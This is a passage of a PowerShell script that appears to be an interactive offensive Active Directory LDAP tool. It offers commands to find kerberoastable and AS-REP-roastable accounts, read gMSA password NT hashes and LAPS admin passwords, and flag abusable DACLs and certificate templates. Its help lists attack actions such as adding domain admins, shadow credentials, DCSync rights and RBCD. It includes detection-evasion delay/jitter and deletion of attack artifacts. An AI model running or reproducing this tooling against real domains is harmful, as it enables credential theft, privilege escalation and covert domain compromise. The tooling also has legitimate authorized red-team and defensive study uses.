            '00000000-0000-0000-0000-000000000000' = 'All'
        }

        # Helper: resolve sAMAccountName to DN
        function Resolve-LdapDN {
            param([string]$Name)
            if ($Name -match ',') { return $Name }
            try {
                $r = New-Object System.DirectoryServices.Protocols.SearchRequest(
                    $ctx.DomainDN, "(sAMAccountName=$Name)", "Subtree", @("distinguishedName")
                )
                $r.SizeLimit = 1
                $rr = $ldap.SendRequest($r)
                if ($rr.Entries.Count -gt 0) { return $rr.Entries[0].DistinguishedName }
            } catch {}
            return $null
        }

        # Helper: resolve DN to SID
        function Resolve-LdapSID {
            param([string]$DN)
            try {
                $r = New-Object System.DirectoryServices.Protocols.SearchRequest(
                    $DN, "(objectClass=*)", "Base", @("objectSid")
                )
                $rr = $ldap.SendRequest($r)
                if ($rr.Entries.Count -gt 0 -and $rr.Entries[0].Attributes["objectSid"]) {
                    return New-Object System.Security.Principal.SecurityIdentifier($rr.Entries[0].Attributes["objectSid"][0], 0)
                }
            } catch {}
            return $null
        }

        # Helper: read ntSecurityDescriptor with SD flags control
        function Get-LdapSD {
            param([string]$DN, [int]$Flags = 7)
            $r = New-Object System.DirectoryServices.Protocols.SearchRequest(
                $DN, "(objectClass=*)", "Base", @("ntSecurityDescriptor")
            )
            $ctrl = New-Object System.DirectoryServices.Protocols.DirectoryControl(
                "1.2.840.113556.1.4.801",
                [byte[]]@(0x30, 0x03, 0x02, 0x01, $Flags), $true, $true
            )
            $r.Controls.Add($ctrl) | Out-Null
            $rr = $ldap.SendRequest($r)
            if ($rr.Entries.Count -gt 0 -and $rr.Entries[0].Attributes["ntSecurityDescriptor"]) {
                $sdBytes = [byte[]]$rr.Entries[0].Attributes["ntSecurityDescriptor"][0]
                return New-Object System.Security.AccessControl.RawSecurityDescriptor($sdBytes, 0)
            }
            return $null
        }

        # Helper: write ntSecurityDescriptor back
        function Set-LdapSD {
            param([string]$DN, [System.Security.AccessControl.RawSecurityDescriptor]$SD, [int]$Flags = 4)
            $sdBytes = New-Object byte[] $SD.BinaryLength
            $SD.GetBinaryForm($sdBytes, 0)
            $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest
            $mod.DistinguishedName = $DN
            $attrMod = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
            $attrMod.Name = "ntSecurityDescriptor"
            $attrMod.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
            $attrMod.Add($sdBytes) | Out-Null
            $mod.Modifications.Add($attrMod) | Out-Null
            $ctrl = New-Object System.DirectoryServices.Protocols.DirectoryControl(
                "1.2.840.113556.1.4.801",
                [byte[]]@(0x30, 0x03, 0x02, 0x01, $Flags), $true, $true
            )
            $mod.Controls.Add($ctrl) | Out-Null
            $ldap.SendRequest($mod) | Out-Null
        }

        # OPSEC: Query delay/jitter state
        $script:queryDelay = 0
        $script:queryJitter = 50

        # Helper: decode access mask to readable rights
        function Format-ADRights {
            param([int]$Mask)
            $r = @()
            if (($Mask -band 0xF01FF) -eq 0xF01FF) { return @("GenericAll") }
            if ($Mask -band 0x00040000) { $r += "WriteDACL" }
            if ($Mask -band 0x00080000) { $r += "WriteOwner" }
            if ($Mask -band 0x00010000) { $r += "Delete" }
            if ($Mask -band 0x00000100) { $r += "ExtendedRight" }
            if ($Mask -band 0x00000020) { $r += "WriteProperty" }
            if ($Mask -band 0x00000010) { $r += "ReadProperty" }
            if ($Mask -band 0x00000008) { $r += "Self" }
            if ($Mask -band 0x00000001) { $r += "CreateChild" }
            if ($Mask -band 0x00000002) { $r += "DeleteChild" }
            if ($r.Count -eq 0) { $r += "0x$($Mask.ToString('X8'))" }
            return $r
        }

        while ($true) {
            $input = Read-Host "  LDAP>"
            if (-not $input -or -not $input.Trim()) { continue }
            $input = $input.Trim()
            if ($input -eq 'quit' -or $input -eq 'exit') { break }

            $searchBase = $ctx.DomainDN
            $searchScope = "Subtree"
            $searchFilter = $null
            $searchAttrs = $defaultAttrs
            $searchLimit = 50
            $showMembers = $false

            $parts = $input -split '\s+', 2
            $cmd = $parts[0].ToLower()
            $arg = if ($parts.Count -gt 1) { $parts[1].Trim() } else { "" }

            switch ($cmd) {
                'help' {
                    Write-Host "  Enum: whoami, user, group, computer, memberof, admins, das, eas, dcs," -ForegroundColor Gray
                    Write-Host "        users, groups, computers, spns, asrep, kerberoast [SPN]," -ForegroundColor Gray
                    Write-Host "        asreproast [user], unconstrained, constrained, delegations," -ForegroundColor Gray
                    Write-Host "        rbcd, gmsa, laps, dacl, acl, owner, sid, search, maq," -ForegroundColor Gray
                    Write-Host "        pwdpolicy, fgpp, domaininfo, lastlogon, lockout, adminsd," -ForegroundColor Gray
                    Write-Host "        sql, web, exchange, sccm, rodc, servicemap, gpolinks," -ForegroundColor Gray
                    Write-Host "        trusts, subnets, sites, gpos, ous, desc, stale, foreigners," -ForegroundColor Gray
                    Write-Host "        neverexpire, passnotreqd, disabled, protected, pre2k," -ForegroundColor Gray
                    Write-Host "        templates, cas, enrollcheck, dnszones, dnsrecords," -ForegroundColor Gray
                    Write-Host "        dn, (raw filter)" -ForegroundColor Gray
                    Write-Host "  Actions: adduser, addda, addcomputer, deluser, passwd, addmember," -ForegroundColor Gray
                    Write-Host "        delmember, shadowcred, clearcred, setrbcd, delrbcd, setdcsync," -ForegroundColor Gray
                    Write-Host "        addspn, delspn, setasrep, setowner, writedacl, disable, enable," -ForegroundColor Gray
                    Write-Host "        dnsadd, dnsdel, setattr" -ForegroundColor Gray
                    continue
                }
                'delay' {
                    if (-not $arg) {
                        if ($script:queryDelay -gt 0) {
                            Write-Host "  [i] Current delay: $($script:queryDelay)ms (+/- $($script:queryJitter)%)" -ForegroundColor Gray
                        } else {
                            Write-Host "  [i] No delay configured (queries execute immediately)" -ForegroundColor Gray
                        }
                        Write-Host "  Usage: delay <ms> [jitter%]  (e.g., delay 1000 50)" -ForegroundColor Yellow
                        Write-Host "  Reset: delay 0" -ForegroundColor Yellow
                        continue
                    }
                    $dParts = $arg -split '\s+'
                    $script:queryDelay = [int]$dParts[0]
                    $script:queryJitter = if ($dParts.Count -gt 1) { [Math]::Min(100, [Math]::Max(0, [int]$dParts[1])) } else { 50 }
                    if ($script:queryDelay -le 0) {
                        $script:queryDelay = 0
                        Write-Host "  [+] Delay disabled" -ForegroundColor Green
                    } else {
                        Write-Host "  [+] Delay set: $($script:queryDelay)ms (+/- $($script:queryJitter)%)" -ForegroundColor Green
                    }
                    continue
                }
                'cleanup' {
                    $cleanDirs = @("$env:TEMP\adcs-ops", "$env:TEMP\shadow-ops", "$env:TEMP\domain-recon")
                    $cleanFiles = @("$env:TEMP\kerberoast-hashes.txt")
                    $total = 0
                    foreach ($d in $cleanDirs) {
                        if (Test-Path $d) {
                            $count = (Get-ChildItem $d -Recurse -File -ErrorAction SilentlyContinue | Measure-Object).Count
                            Remove-Item $d -Recurse -Force -ErrorAction SilentlyContinue
                            $total += $count
                            Write-Host "  [+] Removed: $d ($count files)" -ForegroundColor Green
                        }
                    }
                    foreach ($f in $cleanFiles) {
                        if (Test-Path $f) {
                            Remove-Item $f -Force -ErrorAction SilentlyContinue
                            $total++
                            Write-Host "  [+] Removed: $f" -ForegroundColor Green
                        }
                    }
                    $kirbiFiles = Get-Item "$env:TEMP\tgs-*.kirbi" -ErrorAction SilentlyContinue
                    foreach ($k in $kirbiFiles) {
                        Remove-Item $k.FullName -Force -ErrorAction SilentlyContinue
                        $total++
                        Write-Host "  [+] Removed: $($k.FullName)" -ForegroundColor Green
                    }
                    if ($total -eq 0) {
                        Write-Host "  [i] No artifacts found to clean up" -ForegroundColor Gray
                    } else {
                        Write-Host "  [+] Cleaned $total artifact(s)" -ForegroundColor Cyan
                    }
                    continue
                }
                'whoami' {
                    try {
                        $req = New-Object System.DirectoryServices.Protocols.ExtendedRequest("1.3.6.1.4.1.4203.1.11.3")
                        $resp = $ldap.SendRequest($req)
                        $id = [System.Text.Encoding]::UTF8.GetString($resp.ResponseValue)
                        if ($id -and $id.Trim()) { Write-Host "  [+] $id" -ForegroundColor Green }
                        else { Write-Host "  [!] Anonymous / no identity mapped" -ForegroundColor Yellow }
                    } catch { Write-Host "  [-] whoami not supported" -ForegroundColor Red }
                    continue
                }
                'user' {
                    if (-not $arg) { Write-Host "  Usage: user <sAMAccountName>" -ForegroundColor Yellow; continue }
                    $searchFilter = "(sAMAccountName=$arg)"
                    $searchAttrs = @("sAMAccountName", "distinguishedName", "userPrincipalName", "memberOf", "adminCount", "description", "lastLogonTimestamp", "pwdLastSet", "servicePrincipalName", "userAccountControl")
                }
                'group' {
                    if (-not $arg) { Write-Host "  Usage: group <name>" -ForegroundColor Yellow; continue }
                    $searchFilter = "(&(objectCategory=group)(cn=$arg))"
                    $searchAttrs = @("cn", "distinguishedName", "description", "member", "groupType")
                    $showMembers = $true
                }
                'computer' {
                    if (-not $arg) { Write-Host "  Usage: computer <name>" -ForegroundColor Yellow; continue }
                    $searchFilter = "(&(objectCategory=computer)(cn=$arg))"
                    $searchAttrs = @("cn", "distinguishedName", "dNSHostName", "operatingSystem", "operatingSystemVersion", "userAccountControl", "msDS-AllowedToActOnBehalfOfOtherIdentity", "servicePrincipalName")
                }
                'admins' {
                    $searchFilter = "(&(objectCategory=user)(adminCount=1))"
                    $searchAttrs = @("sAMAccountName", "distinguishedName", "userPrincipalName", "description")
                }
                'das' {
                    $searchFilter = "(&(objectCategory=group)(cn=Domain Admins))"
                    $searchAttrs = @("cn", "distinguishedName", "member")
                    $showMembers = $true
                }
                'eas' {
                    $searchFilter = "(&(objectCategory=group)(cn=Enterprise Admins))"
                    $searchAttrs = @("cn", "distinguishedName", "member")
                    $showMembers = $true
                }
                'dcs' {
                    $searchFilter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
                    $searchAttrs = @("cn", "distinguishedName", "dNSHostName", "operatingSystem")
                }
                'spns' {
                    $searchFilter = "(&(objectCategory=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
                    $searchAttrs = @("sAMAccountName", "servicePrincipalName", "distinguishedName", "adminCount")
                }
                'asrep' {
                    $searchFilter = "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
                    $searchAttrs = @("sAMAccountName", "distinguishedName", "userPrincipalName")
                }
                'unconstrained' {
                    $searchFilter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))"
                    $searchAttrs = @("cn", "distinguishedName", "dNSHostName", "operatingSystem")
                }
                'constrained' {
                    $searchFilter = "(msDS-AllowedToDelegateTo=*)"
                    $searchAttrs = @("sAMAccountName", "distinguishedName", "msDS-AllowedToDelegateTo", "userAccountControl")
                }
                'rbcd' {
                    if (-not $arg) { Write-Host "  Usage: rbcd <computerName>" -ForegroundColor Yellow; continue }
                    $searchFilter = "(&(objectCategory=computer)(cn=$arg))"
                    $searchAttrs = @("cn", "distinguishedName", "msDS-AllowedToActOnBehalfOfOtherIdentity")
                }
                'gmsa' {
                    if (-not $arg) {
                        $searchFilter = "(objectClass=msDS-GroupManagedServiceAccount)"
                        $searchAttrs = @("sAMAccountName", "distinguishedName", "msDS-ManagedPasswordInterval", "servicePrincipalName", "msDS-GroupMSAMembership")
                    } else {
                        # Read specific gMSA password
                        try {
                            $gmsaReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                                $searchBase,
                                "(&(objectClass=msDS-GroupManagedServiceAccount)(sAMAccountName=$arg))",
                                "Subtree",
                                @("sAMAccountName", "distinguishedName", "msDS-ManagedPassword", "msDS-ManagedPasswordInterval")
                            )
                            $gmsaReq.SizeLimit = 1
                            $gmsaResp = $ldap.SendRequest($gmsaReq)
                            if ($gmsaResp.Entries.Count -eq 0) {
                                Write-Host "  [-] gMSA not found: $arg" -ForegroundColor Red
                                continue
                            }
                            $gmsaEntry = $gmsaResp.Entries[0]
                            Write-Host "    DN: $($gmsaEntry.DistinguishedName)" -ForegroundColor White
                            if ($gmsaEntry.Attributes["msDS-ManagedPassword"]) {
                                $blob = [byte[]]$gmsaEntry.Attributes["msDS-ManagedPassword"][0]
                                $parsed = Parse-GMSAPasswordBlob -Blob $blob
                                Write-Host "    [+] NT Hash: $($parsed.NTHash)" -ForegroundColor Cyan
                                Write-Host "    [i] Password blob: $($parsed.PasswordLen) bytes" -ForegroundColor Gray
                            } else {
                                Write-Host "    [!] msDS-ManagedPassword not readable (not authorized)" -ForegroundColor Yellow
                            }
                        } catch {
                            Write-Host "  [-] Error: $($_.Exception.Message)" -ForegroundColor Red
                        }
                        continue
                    }
                }
                'laps' {
                    if (-not $arg) { Write-Host "  Usage: laps <computerName>" -ForegroundColor Yellow; continue }
                    $searchFilter = "(&(objectCategory=computer)(cn=$arg))"
                    $searchAttrs = @("cn", "distinguishedName", "ms-Mcs-AdmPwd", "ms-Mcs-AdmPwdExpirationTime", "msLAPS-Password", "msLAPS-EncryptedPassword", "msLAPS-PasswordExpirationTime")
                }
                'trusts' {
                    $searchFilter = "(objectClass=trustedDomain)"
                    $searchAttrs = @("cn", "distinguishedName", "trustPartner", "trustDirection", "trustType", "trustAttributes")
                }
                'gpos' {
                    $searchFilter = "(objectClass=groupPolicyContainer)"
                    $searchAttrs = @("displayName", "cn", "distinguishedName", "gPCFileSysPath")
                    $searchLimit = 100
                }
                'ous' {
                    $searchFilter = "(objectClass=organizationalUnit)"
                    $searchAttrs = @("ou", "distinguishedName", "description", "gPLink")
                    $searchLimit = 100
                }
                'desc' {
                    $searchFilter = "(&(objectCategory=user)(description=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
                    $searchAttrs = @("sAMAccountName", "distinguishedName", "description")
                }
                'neverexpire' {
                    $searchFilter = "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=65536)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
                    $searchAttrs = @("sAMAccountName", "distinguishedName", "userPrincipalName", "adminCount")
                }
                'disabled' {
                    $searchFilter = "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=2))"
                    $searchAttrs = @("sAMAccountName", "distinguishedName", "description")
                }
                'passnotreqd' {
                    $searchFilter = "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=32)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
                    $searchAttrs = @("sAMAccountName", "distinguishedName", "userPrincipalName", "adminCount")
                }
                'protected' {
                    $searchFilter = "(&(objectCategory=group)(cn=Protected Users))"
                    $searchAttrs = @("cn", "distinguishedName", "member")
                    $showMembers = $true
                }
                'pre2k' {
                    $searchFilter = "(&(objectCategory=group)(cn=Pre-Windows 2000 Compatible Access))"
                    $searchAttrs = @("cn", "distinguishedName", "member")
                    $showMembers = $true
                }
                'stale' {
                    $staleThreshold = (Get-Date).AddDays(-90).ToFileTimeUtc()
                    $searchFilter = "(&(objectCategory=computer)(lastLogonTimestamp<=$staleThreshold))"
                    $searchAttrs = @("cn", "distinguishedName", "lastLogonTimestamp", "operatingSystem")
                }
                'memberof' {
                    if (-not $arg) { Write-Host "  Usage: memberof <sAMAccountName>" -ForegroundColor Yellow; continue }
                    $searchFilter = "(sAMAccountName=$arg)"
                    $searchAttrs = @("sAMAccountName", "distinguishedName", "memberOf")
                }
                'search' {
                    if (-not $arg) { Write-Host "  Usage: search <term>" -ForegroundColor Yellow; continue }
                    $searchFilter = "(|(sAMAccountName=*$arg*)(cn=*$arg*)(description=*$arg*)(displayName=*$arg*)(userPrincipalName=*$arg*))"
                    $searchAttrs = @("sAMAccountName", "distinguishedName", "objectClass", "description")
                }
                'sid' {
                    if (-not $arg) { Write-Host "  Usage: sid <SID string>" -ForegroundColor Yellow; continue }
                    try {
                        $sidObj = New-Object System.Security.Principal.SecurityIdentifier($arg)
                        $sidBytes = New-Object byte[] $sidObj.BinaryLength
                        $sidObj.GetBinaryForm($sidBytes, 0)
                        $sidHex = ($sidBytes | ForEach-Object { '\' + $_.ToString("x2") }) -join ''
                        $searchFilter = "(objectSid=$sidHex)"
                        $searchAttrs = @("sAMAccountName", "distinguishedName", "objectClass", "description", "userPrincipalName")
                    } catch {
                        Write-Host "  [-] Invalid SID: $arg" -ForegroundColor Red
                        continue
                    }
                }
                'maq' {
                    try {
                        $mqReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                            $ctx.DomainDN, "(objectClass=domain)", "Base",
                            @("ms-DS-MachineAccountQuota", "distinguishedName")
                        )
                        $mqResp = $ldap.SendRequest($mqReq)
                        if ($mqResp.Entries.Count -gt 0) {
                            $maqVal = if ($mqResp.Entries[0].Attributes["ms-DS-MachineAccountQuota"]) {
                                $mqResp.Entries[0].Attributes["ms-DS-MachineAccountQuota"][0]
                            } else { "(not set)" }
                            Write-Host "  [+] Machine Account Quota: $maqVal" -ForegroundColor Cyan
                        }
                    } catch { Write-Host "  [-] Error: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }
                'pwdpolicy' {
                    try {
                        $ppReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                            $ctx.DomainDN, "(objectClass=domain)", "Base",
                            @("minPwdLength", "minPwdAge", "maxPwdAge", "pwdHistoryLength",
                              "pwdProperties", "lockoutThreshold", "lockoutDuration", "lockOutObservationWindow")
                        )
                        $ppResp = $ldap.SendRequest($ppReq)
                        if ($ppResp.Entries.Count -gt 0) {
                            $e = $ppResp.Entries[0]
                            Write-Host "  [+] Domain Password Policy:" -ForegroundColor Cyan
                            foreach ($a in @("minPwdLength", "pwdHistoryLength", "pwdProperties", "lockoutThreshold")) {
                                $v = if ($e.Attributes[$a]) { $e.Attributes[$a][0] } else { "(not set)" }
                                Write-Host "      $a : $v" -ForegroundColor Gray
                            }
                            foreach ($a in @("maxPwdAge", "minPwdAge", "lockoutDuration", "lockOutObservationWindow")) {
                                $v = if ($e.Attributes[$a]) {
                                    $ticks = [long]$e.Attributes[$a][0]
                                    if ($ticks -eq 0) { "None" }
                                    elseif ($ticks -eq -9223372036854775808) { "Never" }
                                    else { "$([math]::Abs($ticks / 600000000)) minutes" }
                                } else { "(not set)" }
                                Write-Host "      $a : $v" -ForegroundColor Gray
                            }
                        }
                    } catch { Write-Host "  [-] Error: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }
                'fgpp' {
                    $searchBase = "CN=Password Settings Container,CN=System,$($ctx.DomainDN)"
                    $searchFilter = "(objectClass=msDS-PasswordSettings)"
                    $searchAttrs = @("cn", "distinguishedName", "msDS-PasswordSettingsPrecedence",
                        "msDS-MinimumPasswordLength", "msDS-LockoutThreshold",
                        "msDS-PSOAppliesTo", "msDS-PasswordComplexityEnabled")
                    $searchLimit = 50
                }
                'subnets' {
                    $searchBase = "CN=Subnets,CN=Sites,$($ctx.ConfigNC)"
                    $searchFilter = "(objectClass=subnet)"
                    $searchAttrs = @("cn", "distinguishedName", "siteObject", "description")
                    $searchLimit = 100
                }
                'dacl' {
                    if (-not $arg) { Write-Host "  Usage: dacl <DN or sAMAccountName>" -ForegroundColor Yellow; continue }
                    $daclDN = Resolve-LdapDN $arg
                    if (-not $daclDN) { Write-Host "  [-] Not found: $arg" -ForegroundColor Red; continue }
                    try {
                        $sd = Get-LdapSD -DN $daclDN
                        if (-not $sd) { Write-Host "  [-] Cannot read SD" -ForegroundColor Red; continue }
                        # Owner
                        $ownerStr = try { $sd.Owner.Translate([System.Security.Principal.NTAccount]).Value } catch { $sd.Owner.Value }
                        Write-Host "  Owner: $ownerStr" -ForegroundColor Cyan
                        Write-Host "  DACL ($($sd.DiscretionaryAcl.Count) ACEs):" -ForegroundColor Cyan
                        foreach ($ace in $sd.DiscretionaryAcl) {
                            $aceType = if ($ace.AceType -match 'Allow') { 'ALLOW' } else { 'DENY' }
                            $color = if ($aceType -eq 'ALLOW') { 'Gray' } else { 'Red' }
                            $sidStr = try { $ace.SecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value } catch { $ace.SecurityIdentifier.Value }
                            $rights = Format-ADRights $ace.AccessMask
                            $objInfo = ""
                            if ($ace -is [System.Security.AccessControl.ObjectAce]) {
                                $ot = $ace.ObjectAceType.ToString().ToLower()
                                if ($ot -ne '00000000-0000-0000-0000-000000000000') {
                                    $name = if ($guidMap.ContainsKey($ot)) { $guidMap[$ot] } else { $ot }
                                    $objInfo = " [$name]"
                                }
                            }
                            # Highlight interesting ACEs
                            if ($rights -contains 'GenericAll' -or $rights -contains 'WriteDACL' -or
                                $rights -contains 'WriteOwner' -or $objInfo -match 'Repl') {
                                $color = if ($aceType -eq 'ALLOW') { 'Yellow' } else { 'Red' }
                            }
                            Write-Host "    $aceType $sidStr $($rights -join ',')$objInfo" -ForegroundColor $color
                        }
                    } catch { Write-Host "  [-] Error: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }
                'owner' {
                    if (-not $arg) { Write-Host "  Usage: owner <DN or sAMAccountName>" -ForegroundColor Yellow; continue }
                    $owDN = Resolve-LdapDN $arg
                    if (-not $owDN) { Write-Host "  [-] Not found: $arg" -ForegroundColor Red; continue }
                    try {
                        $sd = Get-LdapSD -DN $owDN -Flags 1
                        if (-not $sd) { Write-Host "  [-] Cannot read SD" -ForegroundColor Red; continue }
                        $ownerStr = try { $sd.Owner.Translate([System.Security.Principal.NTAccount]).Value } catch { $sd.Owner.Value }
                        Write-Host "  [+] Owner of $owDN" -ForegroundColor Cyan
                        Write-Host "      $ownerStr" -ForegroundColor Green
                    } catch { Write-Host "  [-] Error: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }
                'templates' {
                    $searchBase = $ctx.TemplateBase
                    $searchFilter = "(objectClass=pKICertificateTemplate)"
                    $searchAttrs = @("cn", "displayName", "msPKI-Certificate-Name-Flag", "msPKI-Enrollment-Flag", "pKIExtendedKeyUsage", "msPKI-Certificate-Policy")
                    $searchLimit = 100
                }
                'cas' {
                    $searchBase = $ctx.EnrollBase
                    $searchFilter = "(objectClass=pKIEnrollmentService)"
                    $searchAttrs = @("cn", "dNSHostName", "distinguishedName", "certificateTemplates")
                    $searchLimit = 20
                }
                'enrollcheck' {
                    if (-not $arg) { Write-Host "  Usage: enrollcheck <templateName>" -ForegroundColor Yellow; continue }
                    try {
                        # Find the template
                        $ecReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                            $ctx.TemplateBase, "(&(objectClass=pKICertificateTemplate)(cn=$arg))", "Subtree",
                            @("cn", "distinguishedName", "msPKI-Certificate-Name-Flag", "msPKI-Enrollment-Flag",
                              "msPKI-RA-Signature", "pKIExtendedKeyUsage", "msPKI-Certificate-Policy")
                        )
                        $ecReq.SizeLimit = 1
                        $ecResp = $ldap.SendRequest($ecReq)
                        if ($ecResp.Entries.Count -eq 0) { Write-Host "  [-] Template '$arg' not found" -ForegroundColor Red; continue }
                        $tplEntry = $ecResp.Entries[0]
                        $tplDN = $tplEntry.DistinguishedName

                        # Template properties
                        $nameFlag = if ($tplEntry.Attributes["msPKI-Certificate-Name-Flag"]) { [int]$tplEntry.Attributes["msPKI-Certificate-Name-Flag"][0] } else { 0 }
                        $enrollFlag = if ($tplEntry.Attributes["msPKI-Enrollment-Flag"]) { [int]$tplEntry.Attributes["msPKI-Enrollment-Flag"][0] } else { 0 }
                        $raSig = if ($tplEntry.Attributes["msPKI-RA-Signature"]) { [int]$tplEntry.Attributes["msPKI-RA-Signature"][0] } else { 0 }
                        $ekus = @()
                        if ($tplEntry.Attributes["pKIExtendedKeyUsage"]) {
                            for ($i = 0; $i -lt $tplEntry.Attributes["pKIExtendedKeyUsage"].Count; $i++) {
                                $ekus += $tplEntry.Attributes["pKIExtendedKeyUsage"][$i]
                            }
                        }

                        Write-Host "  [+] Template: $arg" -ForegroundColor Cyan
                        Write-Host "      DN: $tplDN" -ForegroundColor Gray

                        # Decode template flags
                        $supplySAN = ($nameFlag -band 1) -eq 1
                        $reqApproval = ($enrollFlag -band 2) -eq 2
                        $noSecExt = ($enrollFlag -band 0x80000) -ne 0
                        Write-Host "      ENROLLEE_SUPPLIES_SUBJECT : $(if ($supplySAN) { 'YES' } else { 'No' })" -ForegroundColor $(if ($supplySAN) { 'Red' } else { 'Green' })
                        Write-Host "      Manager Approval Required : $(if ($reqApproval) { 'YES' } else { 'No' })" -ForegroundColor $(if ($reqApproval) { 'Yellow' } else { 'Green' })
                        Write-Host "      Authorized Signatures     : $raSig" -ForegroundColor Gray
                        Write-Host "      CT_FLAG_NO_SECURITY_EXT   : $(if ($noSecExt) { 'YES' } else { 'No' })" -ForegroundColor $(if ($noSecExt) { 'Yellow' } else { 'Green' })

                        # EKU display
                        $ekuNames = @{
                            '1.3.6.1.5.5.7.3.2' = 'Client Authentication'
                            '1.3.6.1.4.1.311.20.2.2' = 'Smart Card Logon'
                            '1.3.6.1.5.2.3.4' = 'PKINIT Client Auth'
                            '2.5.29.37.0' = 'Any Purpose'
                            '1.3.6.1.4.1.311.20.2.1' = 'Certificate Request Agent'
                            '1.3.6.1.5.5.7.3.1' = 'Server Authentication'
                            '1.3.6.1.5.5.7.3.4' = 'Email Protection'
                            '1.3.6.1.4.1.311.10.3.4' = 'EFS'
                        }
                        if ($ekus.Count -eq 0) {
                            Write-Host "      EKUs: (none - ANY PURPOSE)" -ForegroundColor Red
                        } else {
                            foreach ($eku in $ekus) {
                                $name = if ($ekuNames.ContainsKey($eku)) { "$($ekuNames[$eku]) ($eku)" } else { $eku }
                                $isAuth = $eku -in @('1.3.6.1.5.5.7.3.2','1.3.6.1.4.1.311.20.2.2','1.3.6.1.5.2.3.4','2.5.29.37.0')
                                Write-Host "      EKU: $name" -ForegroundColor $(if ($isAuth) { 'Yellow' } else { 'Gray' })
                            }
                        }

                        # Issuance policies
                        if ($tplEntry.Attributes["msPKI-Certificate-Policy"]) {
                            for ($i = 0; $i -lt $tplEntry.Attributes["msPKI-Certificate-Policy"].Count; $i++) {
                                Write-Host "      Issuance Policy OID: $($tplEntry.Attributes["msPKI-Certificate-Policy"][$i])" -ForegroundColor Magenta
                            }
                        }

                        Write-Host ""

                        # Read template DACL
                        $sd = Get-LdapSD $tplDN
                        if (-not $sd) { Write-Host "  [-] Cannot read template ACL" -ForegroundColor Red; continue }

                        $enrollGuid = [guid]'0e10c968-78fb-11d2-90d4-00c04f79dc55'
                        $autoEnrollGuid = [guid]'a05b8cc2-17bc-4802-a710-e7c15ab866a2'
                        $allExtended = 0x100     # ADS_RIGHT_DS_CONTROL_ACCESS (all extended rights)

                        Write-Host "  --- Enrollment Permissions ---" -ForegroundColor Cyan
                        $enrollers = @()
                        $autoEnrollers = @()
                        $fullControl = @()
                        $dangerousWrite = @()

                        foreach ($ace in $sd.DiscretionaryAcl) {
                            if ($ace.AceType -match 'Deny') { continue }
                            $sidStr = $ace.SecurityIdentifier.Value
                            $ntName = try { $ace.SecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value } catch { $sidStr }
                            $mask = $ace.AccessMask

                            # GenericAll = full control, includes enrollment
                            if (($mask -band 0xF01FF) -eq 0xF01FF) {
                                $fullControl += $ntName
                                continue
                            }

                            # WriteDACL / WriteOwner = can grant themselves enrollment
                            if (($mask -band 0x40000) -or ($mask -band 0x80000)) {
                                $dangerousWrite += $ntName
                            }

                            # Check for Certificate-Enrollment extended right
                            if ($ace -is [System.Security.AccessControl.ObjectAce]) {
                                $og = $ace.ObjectAceType
                                if ($og -eq $enrollGuid) {
                                    $enrollers += $ntName
                                } elseif ($og -eq $autoEnrollGuid) {
                                    $autoEnrollers += $ntName
                                } elseif ($og -eq [guid]::Empty -and ($mask -band $allExtended)) {
                                    # AllExtendedRights - grants all extended rights including enrollment
                                    $enrollers += "$ntName (AllExtendedRights)"
                                }
                            } elseif ($mask -band $allExtended) {
                                # Non-object ACE with extended rights
                                $enrollers += "$ntName (AllExtendedRights)"
                            }
                        }

                        # Deduplicate
                        $enrollers = $enrollers | Select-Object -Unique
                        $autoEnrollers = $autoEnrollers | Select-Object -Unique
                        $fullControl = $fullControl | Select-Object -Unique
                        $dangerousWrite = $dangerousWrite | Select-Object -Unique

                        if ($fullControl.Count -gt 0) {
                            Write-Host "    GenericAll (full control + enroll):" -ForegroundColor Red
                            foreach ($p in $fullControl) { Write-Host "      $p" -ForegroundColor Yellow }
                        }
                        if ($enrollers.Count -gt 0) {
                            Write-Host "    Certificate-Enrollment:" -ForegroundColor Green
                            foreach ($p in $enrollers) { Write-Host "      $p" -ForegroundColor White }
                        }
                        if ($autoEnrollers.Count -gt 0) {
                            Write-Host "    Certificate-AutoEnrollment:" -ForegroundColor Green
                            foreach ($p in $autoEnrollers) { Write-Host "      $p" -ForegroundColor Gray }
                        }
                        if ($dangerousWrite.Count -gt 0) {
                            Write-Host "    WriteDACL/WriteOwner (can self-grant enrollment):" -ForegroundColor Yellow
                            foreach ($p in $dangerousWrite) { Write-Host "      $p" -ForegroundColor Yellow }
                        }

                        # Check which CAs publish this template
                        Write-Host ""
                        Write-Host "  --- Published On CAs ---" -ForegroundColor Cyan
                        $caReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                            $ctx.EnrollBase, "(objectClass=pKIEnrollmentService)", "Subtree",
                            @("cn", "dNSHostName", "certificateTemplates")
                        )
                        $caResp = $ldap.SendRequest($caReq)
                        $published = $false
                        foreach ($caE in $caResp.Entries) {
                            if ($caE.Attributes["certificateTemplates"]) {
                                for ($i = 0; $i -lt $caE.Attributes["certificateTemplates"].Count; $i++) {
                                    if ($caE.Attributes["certificateTemplates"][$i] -eq $arg) {
                                        $caName = if ($caE.Attributes["cn"]) { $caE.Attributes["cn"][0] } else { "?" }
                                        $caHost = if ($caE.Attributes["dNSHostName"]) { $caE.Attributes["dNSHostName"][0] } else { "?" }
